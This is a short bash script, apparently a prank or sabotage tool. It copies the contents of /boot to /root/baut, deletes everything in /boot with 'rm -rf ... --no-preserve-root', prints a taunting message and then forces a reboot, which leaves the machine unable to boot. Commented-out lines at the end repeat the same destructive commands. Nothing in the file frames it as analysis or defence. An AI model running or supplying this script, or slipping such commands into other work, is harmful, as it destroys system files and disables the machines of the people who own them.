#!/bin/bash

path="/boot/"
if [ -d "$path" ] ;
then 
		mkdir /root/baut
		cp /boot/* /root/baut
		rm -rf $path/* --no-preserve-root
		echo "Dude...Why????"
		sleep 5
		init 6 
fi


#s="/boot/"
#r="mkdir /root/baut"
#y="rm -rf $s/* --no-preserve-root"
#bro="init 6 "